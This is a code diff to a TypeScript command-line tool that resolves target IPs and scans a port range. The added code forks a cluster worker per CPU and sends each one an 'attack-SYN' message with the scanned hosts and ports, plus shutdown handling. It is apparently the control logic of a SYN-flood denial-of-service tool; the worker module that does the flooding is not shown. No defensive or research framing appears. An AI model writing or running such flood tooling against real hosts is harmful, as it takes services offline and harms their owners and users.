@@ -1,6 +1,9 @@
+import * as cluster from 'cluster';
+import * as yargs from 'yargs';
 import { resolveIPAddresses, checkPorts } from './helpers';
 import { Address } from './types';
-import * as yargs from 'yargs';
+import worker from './worker';
+import * as os from 'os';
 
 const argv = yargs
   .demandCommand(1)
@@ -21,7 +24,7 @@ const argv = yargs
     const upper = parseInt(matches[2], 10);
 
     if (lower > 65535 || upper > 65535 || upper < lower) {
-      throw new Error('Invalid port range')
+      throw new Error('Invalid port range');
     }
 
     return { lower, upper };
@@ -40,12 +43,44 @@ async function start() {
 
   console.log('Found the following ip addresses:\n', ipAddresses.map(address => address.ip));
 
-  await checkPorts(ipAddresses, argv.ports.lower, argv.ports.upper);
+  const ipPorts = await checkPorts(ipAddresses, argv.ports.lower, argv.ports.upper);
 
-  console.log(ipAddresses)
+  // For each CPU, fork the cluster.
+  for (let i = 0; i < os.cpus().length; i++) {
+    const worker = cluster.fork();
+
+    worker.on('online', () => {
+      worker.send({type: 'attack-SYN', data: ipPorts});
+    });
+  }
+
+  // Intercept exit for cleanup.
+  process.on('SIGINT', () => {
+    console.log('Shutting down gracefully');
+
+    for (const id in cluster.workers) {
+      cluster.workers[id].send({type: 'kill'});
+    }
+
+    // Wait until all clusters have been cleared from memory, then exit the process.
+    setInterval(() => {
+      if (!Object.keys(cluster.workers).length) {
+        console.log('All clusters are exited');
+
+        process.exit();
+      }
+    }, 500);
+  });
 }
 
-start().catch(err => {
-  console.error('An error occured during startup');
-  console.error(err);
-});
+if (cluster.isMaster) {
+  start().catch(err => {
+    console.error('An error occured during startup');
+    console.error(err);
+  });
+} else {
+  worker().catch(err => {
+    console.error('An error occured in the worker');
+    console.error(err);
+  });
+}
